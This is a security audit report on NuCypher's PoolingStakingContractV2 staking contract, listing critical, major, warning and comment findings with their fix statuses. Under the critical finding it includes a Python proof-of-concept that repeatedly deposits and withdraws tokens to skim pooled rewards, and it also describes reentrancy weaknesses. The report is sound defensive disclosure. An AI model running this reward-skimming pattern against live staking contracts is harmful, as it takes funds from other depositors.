# NuCypher PoolingStakingContractV2 Security Audit Report (merged)

###### tags: `NuCypher`

## Introduction

### Project overview
The audited scope implements part of a decentralized network for secrets management and dynamic access control.

### Scope of the Audit
The scope of the audit includes the following smart contracts at:

https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol

The audited commit identifier is `436ae0f134255fabcd49a1d6b5b1eae4fd8c9d51`


## Security Assessment Methodology

2 security auditors and 1 tech lead are involved in the work on the audit who check the provided source code independently of each other in accordance with the methodology described below:

### 1. Blind audit.

* Manual code study.
* Reverse research and study of the architecture of the code based on the source code only.

```
Stage goals:
* Building an independent view of the project’s architecture.
* Finding logical flaws.
```

### 2. Checking the code against the checklist of known vulnerabilities.

* Manual code check for vulnerabilities from the company's internal checklist.
* The company's checklist is constantly updated based on the analysis of hacks, research and audit of the clients’ code.

```
Stage goal: 
Eliminate typical vulnerabilities (e.g. reentrancy, gas limit, flashloan attacks etc.)
```

### 3. Checking the logic, architecture of the security model for compliance with the desired model.

* Detailed study of the project documentation
* Examining contracts tests
* Examining comments in code
* Comparison of the desired model obtained during the study with the reversed view obtained during the blind audit

```
Stage goal: 
Detection of inconsistencies with the desired model
```


### 4. Consolidation of the reports from all auditors into one common interim report document:
* Cross check: each auditor reviews the reports of the others
* Discussion of the found issues by the auditors
* Formation of a general (merged) report

```
Stage goals: 
* Re-check all the problems for relevance and correctness of the threat level
* Provide the client with an interim report
```

### 5. Bug fixing & re-check.
* Client fixes or comments on every issue
* Upon completion of the bug fixing, the auditors double-check each fix and set the statuses with a link to the fix

```
Stage goal:
Preparation of the final code version with all the fixes
```

### 6. Preparation of the final audit report and delivery to the customer.


## Findings Severity breakdown

### Classification of Issues

* CRITICAL: Bugs leading to assets theft, fund access locking, or any other loss funds to be transferred to any party. 
* MAJOR: Bugs that can trigger a contract failure. Further recovery is possible only by manual modification of the contract state or replacement.
* WARNINGS: Bugs that can break the intended contract logic or expose it to DoS attacks. 
* COMMENTS: Other issues and recommendations reported to/ acknowledged by the team.

Based on the feedback received from the Customer's team regarding the list of findings discovered by the Contractor, they are assigned the following statuses:

### Findings' breakdown status

* FIXED: Recommended fixes have been made to the project code and no longer affect its security.
* ACKNOWLEDGED: The project team is aware of this finding. Recommendations for this finding are planned to be resolved in the future. This finding does not affect the overall safety of the project.
* NO ISSUE: Finding does not affect the overall safety of the project and does not violate the logic of its work
* NEW: Waiting for project team's feedback on the finding discovered  


## Report

### CRITICAL
#### 1. Reward sniffing
##### Files
https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol
##### Description
User can deposit-withdraw tokens several times (at the same transaction), causing reward sniffing.
The emulation of this behavior is presented below:
```python
def main():
    deployer = accounts[0]
    workerOwner = accounts[1]
    
    escrow = deployer.deploy(StakingEscrowMock)
    escrow.setAllTokens(9000)

    token = deployer.deploy(EasyToken, 1000_000)
    stacking = deployer.deploy(PoolingStakingContractV2)
    workerFraction = 1
    stacking.initialize(workerFraction, token, escrow, workerOwner, {'from': deployer})
    stacking.enableDeposit({'from': deployer})

    user1 = accounts[2]
    user2 = accounts[3]
    deployer.transfer(stacking, 6000)
    token.mint(user1, 1000_000)
    token.mint(user2, 1000_000)

    token.approve(stacking, 100_000, {'from': user1})
    stacking.depositTokens(100_000, {'from': user1})
    
    for _ in range(100):
        token.approve(stacking, 100, {'from': user2})
        stacking.depositTokens(100, {'from': user2})
        stacking.withdrawAll({'from': user2})
    
    user1_balance = token.balanceOf(user1)
    user2_balance = token.balanceOf(user2)
    stacking_balance = token.balanceOf(stacking)

    print("user1_balance", user1_balance)
    print("user2_balance", user2_balance)
    print("stacking_balance", stacking_balance)

    stacking.withdrawAll({'from': user1})  # >>>> ERROR HERE <<<<
```
##### Recommendation
May be add a check in withdrawAll function to requre deposit DISABLED?

##### Status
Fixed at https://github.com/nucypher/nucypher/commit/afd803d535bafaea26d2fe67e408a42b0608abef


### MAJOR
#### 1. Reentry in `withdrawAll`
##### Description
Malicious token/workerOwner may have a reentry callback to the contract here

https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L236

but the state of the contract changes here

https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L247
it allows to use reentry.

##### Recommendation
Put transfers as the last statements of the method.

##### Status
No issue

##### Client's commentary
> Token contract is trustable contract, all calls are safe.


### WARNINGS
#### 1. Lack of docs
##### Files
https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol

##### Description
The purpose of the contract and the way it will work is not clear from the code.
Also the logic with accumulated `getCumulativeReward` and `totalWithdrawnReward` must be described in the code as well as the typical scenario of the contract usage.

##### Recommendation
Add comprehensive docstrings.

##### Status
Acknowledged


#### 2. Reentry causing events misordering
##### Files
https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol

##### Description
At lines:
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L105
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L192
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L211
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L236
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L249
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L255
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L287

##### Recommendation
Place the `transfer` on the last line of the method.

##### Status
Acknowledged

##### Client's commentary
> All contracts that are called from pool are trustable, transfers of ETH are tested for reentrancy.


#### 3. Deflation tokens support
##### Files
https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol

##### Description
It might be never known that after calling `transfer(value)` the token will really increase someone's balance by `value`, some deflation tokens "burn" some value on every transfer call. So the only way to know it is explicitly checking balance of the tokens' owner after transfer.

##### Recommendation
Add deflation tokens support or explicitly specify in docstring that deflation tokens are not supported.

##### Status
Acknowledged


### COMMENTS
#### 1. Use different tokens as deposit and rewards
##### Files
https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol

##### Description
It's a common practice to split deposit tokens and rewards tokens into 2 different types of tokens because it's safer and user can always withdraw his deposit.
Also, attacks on rewards would not affect the deposit itself.

##### Recommendation
We recommend to split tokens.

##### Status
No issue


#### 2. Uninformative names of an event and a function
##### Description
At the lines:
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L28
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L152
##### Recommendation
Make the names more informative (E.g. `DepositIsEnabledSet` and `getAvailableDelegatorReward`[to avoid double naming])

##### Status
Fixed at https://github.com/nucypher/nucypher/commit/90b2c4767f63baa5c252ce7e825949543fcf03e2


#### 3. Rough BASIS_FRACTION
##### Description
At the line https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L37
`BASIS_FRACTION = 100` is too rough.

##### Recommendation
It would be better to set it to 10000 or even more to increase accuracy.

##### Status
Fixed at https://github.com/nucypher/nucypher/commit/90b2c4767f63baa5c252ce7e825949543fcf03e2


#### 4. Const `workerOwner`
##### Description
https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L40
It's not clear why `workerOwner` is a `const`.

##### Recommendation
If it's not supposed to be transferred, write a comment describing this. 

##### Status
No issue


#### 5. Explicit visibility of `workerFraction`
##### Description
Explicit statements make code more readable.
https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L46
##### Recommendation
Add `public` visibility modifier

##### Status
Acknowledged

##### Client's commentary
> Contract is using also as demonstration/example, so `getWorkerFraction` is the main place to calculate final value for worker fraction


#### 6. External `initialize`
##### Description
Since it will be called by the end-user only, it's better to use `external` modifier: https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L59

##### Recommendation
Use `external` modifier

##### Status
Fixed at https://github.com/nucypher/nucypher/commit/90b2c4767f63baa5c252ce7e825949543fcf03e2


#### 7. `getWorkerFraction` is not needed
##### Description
Public attributes already have getters
https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L91

##### Recommendation
Remove the method `getWorkerFraction`.

##### Status
Acknowledged


#### 8. Comment required
##### Description
It's not intuitive what is happening here
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L116
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L140
- 
##### Recommendation
Add the comment to the code.

##### Status
Fixed at https://github.com/nucypher/nucypher/commit/90b2c4767f63baa5c252ce7e825949543fcf03e2


#### 9. Avoid ternary
##### Description
If-else statement is more clear way for complex conditions
- https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L168

##### Recommendation
Use if-else statement.

##### Status
Fixed at https://github.com/nucypher/nucypher/commit/90b2c4767f63baa5c252ce7e825949543fcf03e2


#### 10. Not clear TODO-comment
##### Description
It's not clear what is that `TODO` about
https://github.com/nucypher/nucypher/blob/main/nucypher/blockchain/eth/sol/source/contracts/staking_contracts/PoolingStakingContractV2.sol#L226

##### Recommendation
Add more details into commentary 

##### Status
Fixed at https://github.com/nucypher/nucypher/commit/90b2c4767f63baa5c252ce7e825949543fcf03e2


## Results

### Findings list

Level | Amount
--- | ---
CRITICAL | 1
MAJOR | 1
WARNING | 3
COMMENT | 10

### Executive summary
The audited contract implements custom staking pool protocol which manage deposits and rewards.

### Conclusion
Smart contracts have been audited and several suspicious places were found. During audit one critical and one major issues were identified as they could lead to some undesired behavior also several issues were marked as warning and comments. After working on audit report all issues were fixed or acknowledged(if issue is not critical or major) by client or concluded as not an issue.

Final commit identifier with all fixes: `afd803d535bafaea26d2fe67e408a42b0608abef`